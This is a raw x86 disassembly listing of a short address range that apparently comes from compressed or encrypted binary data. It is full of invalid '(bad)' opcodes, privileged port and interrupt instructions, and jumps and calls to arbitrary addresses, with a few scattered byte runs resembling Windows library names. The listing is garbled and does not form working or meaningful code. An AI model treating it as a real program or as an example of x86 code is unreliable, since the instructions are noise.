1315c3ee:	e3 2f                	jecxz  0x1315c41f
1315c3f0:	88 10                	mov    %dl,(%eax)
1315c3f2:	37                   	aaa
1315c3f3:	cf                   	iret
1315c3f4:	ed                   	in     (%dx),%eax
1315c3f5:	83 e7 06             	and    $0x6,%edi
1315c3f8:	e6 b8                	out    %al,$0xb8
1315c3fa:	ff 02                	incl   (%edx)
1315c3fc:	0d 10 e8 98 25       	or     $0x2598e810,%eax
1315c401:	ce                   	into
1315c402:	b1 23                	mov    $0x23,%cl
1315c404:	a1 b0 28 77 fd       	mov    0xfd7728b0,%eax
1315c409:	12 77 32             	adc    0x32(%edi),%dh
1315c40c:	b7 7d                	mov    $0x7d,%bh
1315c40e:	59                   	pop    %ecx
1315c40f:	f8                   	clc
1315c410:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315c411:	fc                   	cld
1315c412:	37                   	aaa
1315c413:	5d                   	pop    %ebp
1315c414:	a1 ac 15 83 6c       	mov    0x6c8315ac,%eax
1315c419:	0e                   	push   %cs
1315c41a:	ea 95 c4 7c 22 c0 7a 	ljmp   $0x7ac0,$0x227cc495
1315c421:	64 b0 43             	fs mov $0x43,%al
1315c424:	9a fd 14 80 15 cc 1c 	lcall  $0x1ccc,$0x158014fd
1315c42b:	c8 41 26 94          	enter  $0x2641,$0x94
1315c42f:	1e                   	push   %ds
1315c430:	fe                   	(bad)
1315c431:	9c                   	pushf
1315c432:	39 36                	cmp    %esi,(%esi)
1315c434:	21 83 70 b4 87 c8    	and    %eax,-0x37784b90(%ebx)
1315c43a:	fe                   	(bad)
1315c43b:	e5 1e                	in     $0x1e,%eax
1315c43d:	19 1b                	sbb    %ebx,(%ebx)
1315c43f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315c440:	94                   	xchg   %eax,%esp
1315c441:	78 80                	js     0x1315c3c3
1315c443:	bd 76 07 03 1e       	mov    $0x1e030776,%ebp
1315c448:	d9 b0 c2 05 07 87    	fnstenv -0x78f8fa3e(%eax)
1315c44e:	40                   	inc    %eax
1315c44f:	95                   	xchg   %eax,%ebp
1315c450:	32 bb 63 10 10 5c    	xor    0x5c101063(%ebx),%bh
1315c456:	6f                   	outsl  %ds:(%esi),(%dx)
1315c457:	c4 47 ea             	les    -0x16(%edi),%eax
1315c45a:	06                   	push   %es
1315c45b:	b3 f2                	mov    $0xf2,%bl
1315c45d:	70 88                	jo     0x1315c3e7
1315c45f:	00 0b                	add    %cl,(%ebx)
1315c461:	06                   	push   %es
1315c462:	05 2d c1 5e 25       	add    $0x255ec12d,%eax
1315c467:	cd 64                	int    $0x64
1315c469:	c5 a0 a1 90 fe 20    	lds    0x20fe90a1(%eax),%esp
1315c46f:	9b                   	fwait
1315c470:	08 c8                	or     %cl,%al
1315c472:	28 b9 ef 50 9c 74    	sub    %bh,0x749c50ef(%ecx)
1315c478:	7f 31                	jg     0x1315c4ab
1315c47a:	3e eb 0c             	ds jmp 0x1315c489
1315c47d:	6a 0a                	push   $0xa
1315c47f:	53                   	push   %ebx
1315c480:	0d 84 a1 c8 33       	or     $0x33c8a184,%eax
1315c485:	80 c6 21             	add    $0x21,%dh
1315c488:	6d                   	insl   (%dx),%es:(%edi)
1315c489:	41                   	inc    %ecx
1315c48a:	89 ea                	mov    %ebp,%edx
1315c48c:	73 0c                	jae    0x1315c49a
1315c48e:	6b e1 05             	imul   $0x5,%ecx,%esp
1315c491:	11 4a 95             	adc    %ecx,-0x6b(%edx)
1315c494:	3d e3 78 8f 2f       	cmp    $0x2f8f78e3,%eax
1315c499:	72 12                	jb     0x1315c4ad
1315c49b:	f8                   	clc
1315c49c:	17                   	pop    %ss
1315c49d:	cc                   	int3
1315c49e:	31 0d 6f ca f8 2c    	xor    %ecx,0x2cf8ca6f
1315c4a4:	7a 02                	jp     0x1315c4a8
1315c4a6:	b9 fc 60 30 31       	mov    $0x313060fc,%ecx
1315c4ab:	c1 2b 39             	shrl   $0x39,(%ebx)
1315c4ae:	61                   	popa
1315c4af:	23 0c a3             	and    (%ebx,%eiz,4),%ecx
1315c4b2:	4d                   	dec    %ebp
1315c4b3:	ec                   	in     (%dx),%al
1315c4b4:	8e 26                	mov    (%esi),%fs
1315c4b6:	30 6b 29             	xor    %ch,0x29(%ebx)
1315c4b9:	4d                   	dec    %ebp
1315c4ba:	41                   	inc    %ecx
1315c4bb:	72 7b                	jb     0x1315c538
1315c4bd:	0b 1f                	or     (%edi),%ebx
1315c4bf:	00 dd                	add    %bl,%ch
1315c4c1:	22 de                	and    %dh,%bl
1315c4c3:	8c cb                	mov    %cs,%ebx
1315c4c5:	20 e7                	and    %ah,%bh
1315c4c7:	36 01 53 77          	add    %edx,%ss:0x77(%ebx)
1315c4cb:	2c 1a                	sub    $0x1a,%al
1315c4cd:	86 d9                	xchg   %bl,%cl
1315c4cf:	10 e7                	adc    %ah,%bh
1315c4d1:	4a                   	dec    %edx
1315c4d2:	96                   	xchg   %eax,%esi
1315c4d3:	1e                   	push   %ds
1315c4d4:	bc be 26 e9 05       	mov    $0x5e926be,%esp
1315c4d9:	88 0f                	mov    %cl,(%edi)
1315c4db:	49                   	dec    %ecx
1315c4dc:	83 e8 40             	sub    $0x40,%eax
1315c4df:	ce                   	into
1315c4e0:	f0 b6 a3             	lock mov $0xa3,%dh
1315c4e3:	40                   	inc    %eax
1315c4e4:	e5 29                	in     $0x29,%eax
1315c4e6:	ca dd 83             	lret   $0x83dd
1315c4e9:	c2 56 b9             	ret    $0xb956
1315c4ec:	6f                   	outsl  %ds:(%esi),(%dx)
1315c4ed:	2d c6 c6 e2 0c       	sub    $0xce2c6c6,%eax
1315c4f2:	12 ea                	adc    %dl,%ch
1315c4f4:	40                   	inc    %eax
1315c4f5:	b9 28 92 e0 10       	mov    $0x10e09228,%ecx
1315c4fa:	c0 8e 11 3d f8 e5 7b 	rorb   $0x7b,-0x1a07c2ef(%esi)
1315c501:	4b                   	dec    %ebx
1315c502:	63 ef                	arpl   %ebp,%edi
1315c504:	7b 31                	jnp    0x1315c537
1315c506:	ec                   	in     (%dx),%al
1315c507:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315c508:	95                   	xchg   %eax,%ebp
1315c509:	19 2b                	sbb    %ebp,(%ebx)
1315c50b:	56                   	push   %esi
1315c50c:	95                   	xchg   %eax,%ebp
1315c50d:	f4                   	hlt
1315c50e:	c6 42 7a 90          	movb   $0x90,0x7a(%edx)
1315c512:	01 68 38             	add    %ebp,0x38(%eax)
1315c515:	a3 b0 f8 6d 95       	mov    %eax,0x956df8b0
1315c51a:	84 5f 0f             	test   %bl,0xf(%edi)
1315c51d:	94                   	xchg   %eax,%esp
1315c51e:	45                   	inc    %ebp
1315c51f:	eb 48                	jmp    0x1315c569
1315c521:	35 eb 63 e1 7e       	xor    $0x7ee163eb,%eax
1315c526:	2f                   	das
1315c527:	09 11                	or     %edx,(%ecx)
1315c529:	a1 7c b7 00 50       	mov    0x5000b77c,%eax
1315c52e:	a0 cc 8c 6d b8       	mov    0xb86d8ccc,%al
1315c533:	17                   	pop    %ss
1315c534:	0a c1                	or     %cl,%al
1315c536:	b6 07                	mov    $0x7,%dh
1315c538:	7d 06                	jge    0x1315c540
1315c53a:	1d 1d 95 4b 94       	sbb    $0x944b951d,%eax
1315c53f:	ac                   	lods   %ds:(%esi),%al
1315c540:	20 27                	and    %ah,(%edi)
1315c542:	5c                   	pop    %esp
1315c543:	61                   	popa
1315c544:	54                   	push   %esp
1315c545:	81 10 b0 41 f3 42    	adcl   $0x42f341b0,(%eax)
1315c54b:	1f                   	pop    %ds
1315c54c:	9a 5b ba aa 2d 4a 43 	lcall  $0x434a,$0x2daaba5b
1315c553:	13 05 04 df 64 aa    	adc    0xaa64df04,%eax
1315c559:	20 62 73             	and    %ah,0x73(%edx)
1315c55c:	65 72 33             	gs jb  0x1315c592
1315c55f:	32 ed                	xor    %ch,%ch
1315c561:	93                   	xchg   %eax,%ebx
1315c562:	df 0e                	fisttps (%esi)
1315c564:	3c 0b                	cmp    $0xb,%al
1315c566:	72 6c                	jb     0x1315c5d4
1315c568:	6d                   	insl   (%dx),%es:(%edi)
1315c569:	6f                   	outsl  %ds:(%esi),(%dx)
1315c56a:	6e                   	outsb  %ds:(%esi),(%dx)
1315c56b:	77 69                	ja     0x1315c5d6
1315c56d:	6e                   	outsb  %ds:(%esi),(%dx)
1315c56e:	01 76 c3             	add    %esi,-0x3d(%esi)
1315c571:	fe                   	(bad)
1315c572:	d8 65 74             	fsubs  0x74(%ebp)
1315c575:	0c 61                	or     $0x61,%al
1315c577:	64 76 61             	fs jbe 0x1315c5db
1315c57a:	70 69                	jo     0x1315c5e5
1315c57c:	25 5b 68 65 74       	and    $0x7465685b,%eax
1315c581:	a2 6e d6 08 0e       	mov    %al,0xe08d66e
1315c586:	49                   	dec    %ecx
1315c587:	44                   	inc    %esp
1315c588:	47                   	inc    %edi
1315c589:	6d                   	insl   (%dx),%es:(%edi)
1315c58a:	55                   	push   %ebp
1315c58b:	31 47 61             	xor    %eax,0x61(%edi)
1315c58e:	1b 4d 46             	sbb    0x46(%ebp),%ecx
1315c591:	30 fa                	xor    %bh,%dl
1315c593:	4a                   	dec    %edx
1315c594:	d4 15                	aam    $0x15
1315c596:	57                   	push   %edi
1315c597:	cf                   	iret
1315c598:	77 5c                	ja     0x1315c5f6
1315c59a:	15 aa 96 41 90       	adc    $0x904196aa,%eax
1315c59f:	93                   	xchg   %eax,%ebx
1315c5a0:	95                   	xchg   %eax,%ebp
1315c5a1:	b2 87                	mov    $0x87,%dl
1315c5a3:	fa                   	cli
1315c5a4:	5b                   	pop    %ebx
1315c5a5:	63 d7                	arpl   %edx,%edi
1315c5a7:	6c                   	insb   (%dx),%es:(%edi)
1315c5a8:	0f 8a 57 35 58 5f    	jp     0x726dfb05
1315c5ae:	00 e7                	add    %ah,%bh
1315c5b0:	62 94 85 0c 1f d3 47 	bound  %edx,0x47d31f0c(%ebp,%eax,4)
1315c5b7:	44                   	inc    %esp
1315c5b8:	e4 81                	in     $0x81,%al
1315c5ba:	5b                   	pop    %ebx
1315c5bb:	2c 53                	sub    $0x53,%al
1315c5bd:	5d                   	pop    %ebp
1315c5be:	38 1c 2a             	cmp    %bl,(%edx,%ebp,1)
1315c5c1:	71 8c                	jno    0x1315c54f
1315c5c3:	7c 54                	jl     0x1315c619
1315c5c5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315c5c6:	4c                   	dec    %esp
1315c5c7:	32 d9                	xor    %cl,%bl
1315c5c9:	61                   	popa
1315c5ca:	e1 60                	loope  0x1315c62c
1315c5cc:	09 70 7c             	or     %esi,0x7c(%eax)
1315c5cf:	f0 c1 da 86          	lock rcr $0x86,%edx
1315c5d3:	36 f3 9f             	ss repz lahf
1315c5d6:	5f                   	pop    %edi
1315c5d7:	8d 87 22 65 83 cb    	lea    -0x347c9ade(%edi),%eax
1315c5dd:	32 46 a0             	xor    -0x60(%esi),%al
1315c5e0:	8d 2f                	lea    (%edi),%ebp
1315c5e2:	8d                   	lea    (bad),%eax
1315c5e3:	c2 63 94             	ret    $0x9463
1315c5e6:	e8 8d 83 cc 48       	call   0x5be24978
1315c5eb:	76 68                	jbe    0x1315c655
1315c5ed:	10 27                	adc    %ah,(%edi)
1315c5ef:	d0 b6 60 8a 0e 80    	shlb   $1,-0x7ff175a0(%esi)
1315c5f5:	bf f3 8d 26 1d       	mov    $0x1d268df3,%edi
1315c5fa:	ed                   	in     (%dx),%eax
1315c5fb:	8f                   	(bad)
1315c5fc:	2f                   	das
1315c5fd:	63 be 8d 8f 3a 20    	arpl   %edi,0x203a8f8d(%esi)
1315c603:	93                   	xchg   %eax,%ebx
1315c604:	e0 09                	loopne 0x1315c60f
1315c606:	05 11 b2 cd 78       	add    $0x78cdb211,%eax
1315c60b:	22 c0                	and    %al,%al
1315c60d:	2e b9 8c 5c 72 c9    	cs mov $0xc9725c8c,%ecx
1315c613:	50                   	push   %eax
1315c614:	01 ba 36 64 93 80    	add    %edi,-0x7f6c9bca(%edx)
1315c61a:	b9 ea 0b 5f f4       	mov    $0xf45f0bea,%ecx
1315c61f:	3f                   	aas
1315c620:	36 90                	ss nop
1315c622:	9b                   	fwait
1315c623:	7b b9                	jnp    0x1315c5de
1315c625:	88 c7                	mov    %al,%bh
1315c627:	6d                   	insl   (%dx),%es:(%edi)
1315c628:	ea 0b b1 75 6e bf 48 	ljmp   $0x48bf,$0x6e75b10b
1315c62f:	7b 75                	jnp    0x1315c6a6
1315c631:	49                   	dec    %ecx
1315c632:	0e                   	push   %cs
1315c633:	d6                   	salc
1315c634:	07                   	pop    %es
1315c635:	1c 3b                	sbb    $0x3b,%al
1315c637:	e8 13 a9 74 3a       	call   0x4d8a6f4f
1315c63c:	54                   	push   %esp
1315c63d:	76 15                	jbe    0x1315c654
1315c63f:	72 04                	jb     0x1315c645
1315c641:	6a e6                	push   $0xffffffe6
1315c643:	88 fe                	mov    %bh,%dh
1315c645:	2a 18                	sub    (%eax),%bl
1315c647:	22 d9                	and    %cl,%bl
1315c649:	c8 76 46 3c          	enter  $0x4676,$0x3c
1315c64d:	77 15                	ja     0x1315c664
1315c64f:	16                   	push   %ss
1315c650:	32 40 2e             	xor    0x2e(%eax),%al
1315c653:	5c                   	pop    %esp
1315c654:	56                   	push   %esi
1315c655:	c9                   	leave
1315c656:	4c                   	dec    %esp
1315c657:	dc 1f                	fcompl (%edi)
1315c659:	d4 02                	aam    $0x2
1315c65b:	12 bc 8c d2 32 c6 74 	adc    0x74c632d2(%esp,%ecx,4),%bh
1315c662:	21 12                	and    %edx,(%edx)
1315c664:	0d 82 4d 2a bf       	or     $0xbf2a4d82,%eax
1315c669:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315c66a:	6f                   	outsl  %ds:(%esi),(%dx)
1315c66b:	3e 9b                	ds fwait
1315c66d:	24 80                	and    $0x80,%al
1315c66f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315c670:	68 06 20 68 88       	push   $0x88682006
1315c675:	13 4a 21             	adc    0x21(%edx),%ecx
1315c678:	5b                   	pop    %ebx
1315c679:	10 43 4e             	adc    %al,0x4e(%ebx)
1315c67c:	ea b6 8b 60 14 6a e6 	ljmp   $0xe66a,$0x14608bb6
1315c683:	17                   	pop    %ss
1315c684:	93                   	xchg   %eax,%ebx
1315c685:	cc                   	int3
1315c686:	39 c2                	cmp    %eax,%edx
1315c688:	58                   	pop    %eax
1315c689:	46                   	inc    %esi
1315c68a:	6c                   	insb   (%dx),%es:(%edi)
1315c68b:	0a f6                	or     %dh,%dh
1315c68d:	cf                   	iret
1315c68e:	bb 25 47 46 b7       	mov    $0xb7464725,%ebx
1315c693:	73 0b                	jae    0x1315c6a0
1315c695:	6c                   	insb   (%dx),%es:(%edi)
1315c696:	77 06                	ja     0x1315c69e
1315c698:	58                   	pop    %eax
1315c699:	d1 73 1c             	shll   $1,0x1c(%ebx)
1315c69c:	0b 7f 61             	or     0x61(%edi),%edi
1315c69f:	d1 32                	shll   $1,(%edx)
1315c6a1:	00 fb                	add    %bh,%bl
1315c6a3:	b7 98                	mov    $0x98,%bh
1315c6a5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315c6a6:	8a 41 9b             	mov    -0x65(%ecx),%al
1315c6a9:	74 00                	je     0x1315c6ab
1315c6ab:	43                   	inc    %ebx
1315c6ac:	76 05                	jbe    0x1315c6b3
1315c6ae:	ab                   	stos   %eax,%es:(%edi)
1315c6af:	3f                   	aas
1315c6b0:	00 91 60 92 4d 07    	add    %dl,0x74d9260(%ecx)
1315c6b6:	39 a8 2c b9 0a 78    	cmp    %ebp,0x780ab92c(%eax)
1315c6bc:	0d 80 8d 5a 0a       	or     $0xa5a8d80,%eax
1315c6c1:	66 9b                	data16 fwait
1315c6c3:	54                   	push   %esp
1315c6c4:	ed                   	in     (%dx),%eax
1315c6c5:	2b 48 a8             	sub    -0x58(%eax),%ecx
1315c6c8:	98                   	cwtl
1315c6c9:	1d 28 f6 be 8a       	sbb    $0x8abef628,%eax
1315c6ce:	0e                   	push   %cs
1315c6cf:	ae                   	scas   %es:(%edi),%al
1315c6d0:	e8 95 0d 31 c2       	call   0xd546d46a
1315c6d5:	9d                   	popf
1315c6d6:	ec                   	in     (%dx),%al
1315c6d7:	c9                   	leave
1315c6d8:	30 19                	xor    %bl,(%ecx)
1315c6da:	10 0a                	adc    %cl,(%edx)
1315c6dc:	16                   	push   %ss
1315c6dd:	ac                   	lods   %ds:(%esi),%al
1315c6de:	04 f6                	add    $0xf6,%al
1315c6e0:	9b                   	fwait
1315c6e1:	cc                   	int3
1315c6e2:	5d                   	pop    %ebp
1315c6e3:	06                   	push   %es
1315c6e4:	ba 70 38 14 29       	mov    $0x29143870,%edx
1315c6e9:	8d 1c 48             	lea    (%eax,%ecx,2),%ebx
1315c6ec:	19 fb                	sbb    %edi,%ebx
1315c6ee:	00 f3                	add    %dh,%bl
1315c6f0:	39 68 78             	cmp    %ebp,0x78(%eax)
1315c6f3:	95                   	xchg   %eax,%ebp
1315c6f4:	20 3a                	and    %bh,(%edx)
1315c6f6:	47                   	inc    %edi
1315c6f7:	9d                   	popf
1315c6f8:	a8 cc                	test   $0xcc,%al
1315c6fa:	d8 6f b5             	fsubrs -0x4b(%edi)
1315c6fd:	0c 68                	or     $0x68,%al
1315c6ff:	a0 31 24 20 97       	mov    0x97202431,%al
1315c704:	bd 4b ec 95 0f       	mov    $0xf95ec4b,%ebp
1315c709:	47                   	inc    %edi
1315c70a:	28 25 07 32 32 a8    	sub    %ah,0xa8323207
1315c710:	18 18                	sbb    %bl,(%eax)
1315c712:	36 85 0c c9          	test   %ecx,%ss:(%ecx,%ecx,8)
1315c716:	1c 1c                	sbb    $0x1c,%al
1315c718:	b8 8f 8c 3c 07       	mov    $0x73c8c8f,%eax
1315c71d:	32 10                	xor    (%eax),%dl
1315c71f:	10 d4                	adc    %dl,%ah
1315c721:	14 d8                	adc    $0xd8,%al
1315c723:	13 c9                	adc    %ecx,%ecx
1315c725:	90                   	nop
1315c726:	14 ff                	adc    $0xff,%al
1315c728:	75 fc                	jne    0x1315c726
1315c72a:	7f 08                	jg     0x1315c734
1315c72c:	21 43 36             	and    %eax,0x36(%ebx)
1315c72f:	0c 37                	or     $0x37,%al
1315c731:	0c 5d                	or     $0x5d,%al
1315c733:	c2 08 59             	ret    $0x5908
1315c736:	29 f0                	sub    %esi,%eax
1315c738:	5e                   	pop    %esi
1315c739:	cc                   	int3
1315c73a:	f0 3c 6c             	lock cmp $0x6c,%al
1315c73d:	88 0f                	mov    %cl,(%edi)
1315c73f:	df 95 08 84 45 4b    	fists  0x4b458408(%ebp)
1315c745:	62 54 af 01          	bound  %edx,0x1(%edi,%ebp,4)
1315c749:	f9                   	stc
1315c74a:	0d 88 e4 46 32       	or     $0x3246e488,%eax
1315c74f:	28 9c fa f8 a8 b1 49 	sub    %bl,0x49b1a8f8(%edx,%edi,8)
1315c756:	28 18                	sub    %bl,(%eax)
1315c758:	96                   	xchg   %eax,%esi
1315c759:	16                   	push   %ss
1315c75a:	40                   	inc    %eax
1315c75b:	94                   	xchg   %eax,%esp
1315c75c:	c8 c9 a8 9e          	enter  $0xa8c9,$0x9e
1315c760:	08 08                	or     %cl,(%eax)
1315c762:	26 28 fe             	es sub %bh,%dh
1315c765:	21 4d d4             	and    %ecx,-0x2c(%ebp)
1315c768:	61                   	popa
1315c769:	f0 fa                	lock cli
1315c76b:	cc                   	int3
1315c76c:	aa                   	stos   %al,%es:(%edi)
1315c76d:	47                   	inc    %edi
1315c76e:	13 75 ca             	adc    -0x36(%ebp),%esi
1315c771:	f8                   	clc
1315c772:	1c 8e                	sbb    $0x8e,%al
1315c774:	8e 03                	mov    (%ebx),%es
1315c776:	0b f8                	or     %eax,%edi
1315c778:	b9 66 c9 2e cf       	mov    $0xcf2ec966,%ecx
1315c77d:	83 15 f5 1e cd 00 1f 	adcl   $0x1f,0xcd1ef5
1315c784:	3a 0f                	cmp    (%edi),%cl
1315c786:	3c b7                	cmp    $0xb7,%al
1315c788:	00 b2 22 07 17 93    	add    %dh,-0x6ce8f8de(%edx)
1315c78e:	69 64 ac 21 70 23 71 	imul   $0x41712370,0x21(%esp,%ebp,4),%esp
1315c795:	41 
1315c796:	05 53 35 df 7b       	add    $0x7bdf3553,%eax
1315c79b:	66 48                	dec    %ax
1315c79d:	23 2f                	and    (%edi),%ebp
1315c79f:	07                   	pop    %es
1315c7a0:	0a 64 34 9b          	or     -0x65(%esp,%esi,1),%ah
1315c7a4:	39 8b 57 17 14 37    	cmp    %ecx,0x37141757(%ebx)
1315c7aa:	66 45                	inc    %bp
1315c7ac:	74 b3                	je     0x1315c761
1315c7ae:	07                   	pop    %es
1315c7af:	0d 87 49 67 19       	or     $0x19674987,%eax
1315c7b4:	33 10                	xor    (%eax),%edx
1315c7b6:	73 00                	jae    0x1315c7b8
1315c7b8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315c7b9:	ee                   	out    %al,(%dx)
1315c7ba:	0d 67 3d f7 09       	or     $0x9f73d67,%eax
1315c7bf:	f4                   	hlt
1315c7c0:	d2 9b 6c 66 7f 06    	rcrb   %cl,0x67f666c(%ebx)
1315c7c6:	47                   	inc    %edi
1315c7c7:	7e 20                	jle    0x1315c7e9
1315c7c9:	25 30 95 1a d4       	and    $0xd41a9530,%eax
1315c7ce:	94                   	xchg   %eax,%esp
1315c7cf:	5b                   	pop    %ebx
1315c7d0:	f4                   	hlt
1315c7d1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315c7d2:	49                   	dec    %ecx
1315c7d3:	a8 0b                	test   $0xb,%al
1315c7d5:	b9 41 a4 5c a9       	mov    $0xa95ca441,%ecx
1315c7da:	33 ec                	xor    %esp,%ebp
1315c7dc:	a0 26 3d 07 3c       	mov    0x3c073d26,%al
1315c7e1:	91                   	xchg   %eax,%ecx
1315c7e2:	88 a9 4e 3d c4 85    	mov    %ch,-0x7a3bc2b2(%ecx)
1315c7e8:	09 68 7e             	or     %ebp,0x7e(%eax)
1315c7eb:	e4 41                	in     $0x41,%al
1315c7ed:	69 c0 a0 96 0c 59    	imul   $0x590c96a0,%eax,%eax
1315c7f3:	11 74 dd 95          	adc    %esi,-0x6b(%ebp,%ebx,8)
1315c7f7:	87 46 f7             	xchg   %eax,-0x9(%esi)
1315c7fa:	6b 77 4d c2          	imul   $0xffffffc2,0x4d(%edi),%esi
1315c7fe:	de 09                	fimuls (%ecx)
1315c800:	98                   	cwtl
1315c801:	b5 1d                	mov    $0x1d,%ch
1315c803:	82 19 83             	sbbb   $0x83,(%ecx)
1315c806:	cf                   	iret
1315c807:	c0 94 93 41 68 94 aa 	rclb   $0x22,-0x556b97bf(%ebx,%edx,4)
1315c80e:	22 
1315c80f:	64 92                	fs xchg %eax,%edx
1315c811:	c9                   	leave
1315c812:	0e                   	push   %cs
1315c813:	a0 09 b0 bc b7       	mov    0xb7bcb009,%al
1315c818:	78 84                	js     0x1315c79e
1315c81a:	99                   	cltd
1315c81b:	c8 43 b1 d0          	enter  $0xb143,$0xd0
1315c81f:	aa                   	stos   %al,%es:(%edi)
1315c820:	19 f8                	sbb    %edi,%eax
1315c822:	40                   	inc    %eax
1315c823:	36 e8 aa 8b 83 08    	ss call 0x1b9953d3
1315c829:	00 6a 23             	add    %ch,0x23(%edx)
1315c82c:	c2 44 48             	ret    $0x4844
1315c82f:	ab                   	stos   %eax,%es:(%edi)
1315c830:	3a b6 2e ea 0e 81    	cmp    -0x7ef115d2(%esi),%dh
1315c836:	07                   	pop    %es
1315c837:	be 01 20 2e 0b       	mov    $0xb2e2001,%esi
1315c83c:	02 79 9a             	add    -0x66(%ecx),%bh
1315c83f:	e5 69                	in     $0x69,%eax
1315c841:	05 22 03 04 16       	add    $0x16040322,%eax
1315c846:	9b                   	fwait
1315c847:	00 9e 66 04 03 0a    	add    %bl,0xa030466(%esi)
1315c84d:	1e                   	push   %ds
1315c84e:	05 be e7 16 d9       	add    $0xd916e7be,%eax
1315c853:	0e                   	push   %cs
1315c854:	97                   	xchg   %eax,%edi
1315c855:	47                   	inc    %edi
1315c856:	04 1a                	add    $0x1a,%al
1315c858:	bf 20 9e 23 cf       	mov    $0xcf239e20,%edi
1315c85d:	b1 2b                	mov    $0x2b,%cl
1315c85f:	4a                   	dec    %edx
1315c860:	bf 10 1f bf 30       	mov    $0x30bf1f10,%edi
1315c865:	13 01                	adc    (%ecx),%eax
1315c867:	ea 3c 47 bf 40 07 2e 	ljmp   $0x2e07,$0x40bf473c
1315c86e:	6c                   	insb   (%dx),%es:(%edi)
1315c86f:	70 16                	jo     0x1315c887
1315c871:	78 0b                	js     0x1315c87e
1315c873:	f7 56 87             	notl   -0x79(%esi)
1315c876:	0c 35                	or     $0x35,%al
1315c878:	22 98 5c 80 9a 85    	and    -0x7a657fa4(%eax),%bl
1315c87e:	3c 64                	cmp    $0x64,%al
1315c880:	5e                   	pop    %esi
1315c881:	01 09                	add    %ecx,(%ecx)
1315c883:	12 3f                	adc    (%edi),%bh
1315c885:	3f                   	aas
1315c886:	06                   	push   %es
1315c887:	21 04 12             	and    %eax,(%edx,%edx,1)
1315c88a:	47                   	inc    %edi
1315c88b:	8b 05 7c c1 aa e7    	mov    0xe7aac17c,%eax
1315c891:	d8 25 ae eb 62 7b    	fsubs  0x7b62ebae
1315c897:	db 2b                	fldt   (%ebx)
1315c899:	41                   	inc    %ecx
1315c89a:	c9                   	leave
1315c89b:	4c                   	dec    %esp
1315c89c:	3f                   	aas
1315c89d:	42                   	inc    %edx
1315c89e:	3d a0 be 02 ba       	cmp    $0xba02bea0,%eax
1315c8a3:	4f                   	dec    %edi
1315c8a4:	45                   	inc    %ebp
1315c8a5:	53                   	push   %ebx
1315c8a6:	f1                   	int1
1315c8a7:	25 c0 c2 8d 45       	and    $0x458dc2c0,%eax
1315c8ac:	f7 27                	mull   (%edi)
1315c8ae:	4e                   	dec    %esi
1315c8af:	17                   	pop    %ss
1315c8b0:	09 20                	or     %esp,(%eax)
1315c8b2:	cf                   	iret
1315c8b3:	80 d9 1b             	sbb    $0x1b,%cl
1315c8b6:	63 9d ab 64 83 55    	arpl   %ebx,0x558364ab(%ebp)
1315c8bc:	f0 b8 78 c1 47 74    	lock mov $0x7447c178,%eax
1315c8c2:	09 f2                	or     %esi,%edx
1315c8c4:	30 60 c8             	xor    %ah,-0x38(%eax)
1315c8c7:	70 7b                	jo     0x1315c944
1315c8c9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315c8ca:	ab                   	stos   %eax,%es:(%edi)
1315c8cb:	66 db 75 13          	data16 (bad) 0x13(%ebp)
1315c8cf:	0e                   	push   %cs
1315c8d0:	4b                   	dec    %ebx
1315c8d1:	b0 13                	mov    $0x13,%al
1315c8d3:	a0 49 03 70 b2       	mov    0xb2700349,%al
1315c8d8:	59                   	pop    %ecx
1315c8d9:	36 cb                	ss lret
1315c8db:	94                   	xchg   %eax,%esp
1315c8dc:	47                   	inc    %edi
1315c8dd:	40                   	inc    %eax
1315c8de:	d8 49 a8             	fmuls  -0x58(%ecx)
1315c8e1:	00 4d 66             	add    %cl,0x66(%ebp)
1315c8e4:	d9 99 ee d0 4c 1f    	fstps  0x1f4cd0ee(%ecx)
1315c8ea:	4d                   	dec    %ebp
1315c8eb:	03 dc                	add    %esp,%ebx
1315c8ed:	4f                   	dec    %edi
1315c8ee:	ac                   	lods   %ds:(%esi),%al
1315c8ef:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315c8f0:	eb 36                	jmp    0x1315c928
1315c8f2:	cb                   	lret
1315c8f3:	68 5f 10 c4 60       	push   $0x60c4105f
1315c8f8:	33 60 17             	xor    0x17(%eax),%esp
1315c8fb:	66 e6 b6             	data16 out %al,$0xb6
1315c8fe:	59                   	pop    %ecx
1315c8ff:	76 03                	jbe    0x1315c904
1315c901:	d4 69                	aam    $0x69
1315c903:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315c904:	4c                   	dec    %esp
1315c905:	71 3b                	jno    0x1315c942
1315c907:	1c 71                	sbb    $0x71,%al
1315c909:	3a 73 db             	cmp    -0x25(%ebx),%dh
1315c90c:	99                   	cltd
1315c90d:	99                   	cltd
1315c90e:	03 2c 9d 4f fc 9c 6f 	add    0x6f9cfc4f(,%ebx,4),%ebp
1315c915:	60                   	pusha
1315c916:	f7 b9 ef 60 f7 b1    	idivl  -0x4e089f11(%ecx)
1315c91c:	48                   	dec    %eax
1315c91d:	0b af 20 07 e9 28    	or     0x28e90720(%edi),%ebp
1315c923:	d8 3e                	fdivrs (%esi)
1315c925:	ad                   	lods   %ds:(%esi),%eax
1315c926:	18 07                	sbb    %al,(%edi)
1315c928:	13 db                	adc    %ebx,%ebx
1315c92a:	14 3d                	adc    $0x3d,%al
1315c92c:	b9 02 03 2c 16       	mov    $0x162c0302,%ecx
1315c931:	02 28                	add    (%eax),%ch
1315c933:	59                   	pop    %ecx
1315c934:	05 27 f9 f4 69       	add    $0x69f4f927,%eax
1315c939:	bc 20 ac f4 71       	mov    $0x71f4ac20,%esp
1315c93e:	89 80 ee a1 cc 3c    	mov    %eax,0x3ccca1ee(%eax)
1315c944:	c6 c4 07             	mov    $0x7,%ah
1315c947:	80 8b 59 05 27 6d 54 	orb    $0x54,0x6d270559(%ebx)
1315c94e:	00 d0                	add    %dl,%al
1315c950:	51                   	push   %ecx
1315c951:	04 0a                	add    $0xa,%al
1315c953:	5d                   	pop    %ebp
1315c954:	06                   	push   %es
1315c955:	9e                   	sahf
1315c956:	6c                   	insb   (%dx),%es:(%edi)
1315c957:	63 ed                	arpl   %ebp,%ebp
